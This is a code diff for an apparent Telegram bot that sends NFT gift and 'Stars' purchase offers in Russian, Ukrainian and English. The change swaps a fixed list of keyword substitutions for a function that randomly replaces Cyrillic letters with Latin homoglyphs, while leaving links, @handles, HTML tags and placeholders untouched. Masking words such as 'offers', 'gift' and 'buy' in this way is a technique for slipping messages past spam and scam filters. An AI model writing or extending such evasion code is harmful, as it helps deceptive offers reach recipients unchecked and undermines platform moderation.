@@ -89,22 +89,52 @@ def mask_stars(currency: str) -> str:
         return "Ѕtаrѕ"
     return currency.capitalize()
 
-# Умная точечная подмена только для ключевых слов (RU/UA)
-SMART_REPLACE = {
-    "предлагает": "прeдлaгaeт",
-    "пропонує": "прoпoнyє",
-    "подарок": "пoдapок",
-    "подарунок": "пoдapунoк",
-    "Stars": "Ѕtаrѕ",
-    "stars": "Ѕtаrѕ",
-    "купить": "кyпить",
-    "купити": "кyпити",
+CYR_TO_LAT = {
+    "а": "a", "е": "e", "о": "o", "р": "p", "с": "c", "х": "x", "у": "y",
+    "А": "A", "Е": "E", "О": "O", "Р": "P", "С": "C", "Х": "X", "У": "Y",
+    "і": "i", "І": "I",
 }
 
-def smart_mask(text: str) -> str:
-    for word, masked in SMART_REPLACE.items():
-        text = text.replace(word, masked)
-    return text
+def smart_randomize(text: str) -> str:
+    probability = random.uniform(0.25, 0.55)
+    result = []
+    i = 0
+    n = len(text)
+    while i < n:
+        if text[i] == "<":
+            end = text.find(">", i)
+            if end != -1:
+                result.append(text[i:end + 1])
+                i = end + 1
+                continue
+        if text[i:i+7].lower() == "http://" or text[i:i+8].lower() == "https://":
+            end = i
+            while end < n and text[end] not in " \n\t<>":
+                end += 1
+            result.append(text[i:end])
+            i = end
+            continue
+        if text[i] == "@":
+            end = i + 1
+            while end < n and (text[end].isalnum() or text[end] == "_"):
+                end += 1
+            result.append(text[i:end])
+            i = end
+            continue
+        if text[i:i+2] == "@@" and i + 2 < n:
+            end = text.find("@@", i + 2)
+            if end != -1:
+                result.append(text[i:end + 2])
+                i = end + 2
+                continue
+
+        char = text[i]
+        if char in CYR_TO_LAT and random.random() < probability:
+            result.append(CYR_TO_LAT[char])
+        else:
+            result.append(char)
+        i += 1
+    return "".join(result)
 
 HOMOGLYPH_CYR = {
     "а": "a", "е": "e", "о": "o", "с": "c", "р": "p", "х": "x", "у": "y",
@@ -232,6 +262,8 @@ def get_lang(code: str) -> str:
     if not code:
         return "ru"
     c = code.strip().lower()
+    if c == "en":
+        return "us"
     return c if c in TEXTS else "ru"
 
 def get_offer_keyboard(order_id: str, lang: str) -> InlineKeyboardMarkup:
@@ -336,12 +368,10 @@ async def cmd_rep_business(message: types.Message):
         nft_link="@@NFT@@",
     )
 
-    # RU/UA — только точечная подмена ключевых слов
-    # US — полная рандомизация
     if lang in ("ru", "ua"):
-        offer_text_rand = smart_mask(offer_text_raw)
+        offer_text_rand = smart_randomize(offer_text_raw)
         nft_name_rand = nft_full_name
-        expires_text = smart_mask(t['offer_expires'])
+        expires_text = smart_randomize(t['offer_expires'])
     else:
         offer_text_rand = randomize_all(offer_text_raw, probability=1.0)
         nft_name_rand = randomize_all(nft_full_name, probability=1.0)
@@ -370,7 +400,7 @@ async def cmd_rep_business(message: types.Message):
             ),
             parse_mode="HTML"
         )
-        print(f"[OFFER] sent")
+        print(f"[OFFER] sent lang={lang}")
     except Exception as e:
         print(f"[SEND ERROR] {e}")
 
@@ -455,7 +485,7 @@ async def process_decline(callback: CallbackQuery):
     lang = offer["lang"]
     t = TEXTS[lang]
 
-    declined_rand = t['declined'] if lang in ("ru", "ua") else randomize_all(t['declined'], probability=1.0)
+    declined_rand = smart_randomize(t['declined']) if lang in ("ru", "ua") else randomize_all(t['declined'], probability=1.0)
     text = f"{cross_emoji()} {declined_rand}"
 
     try:
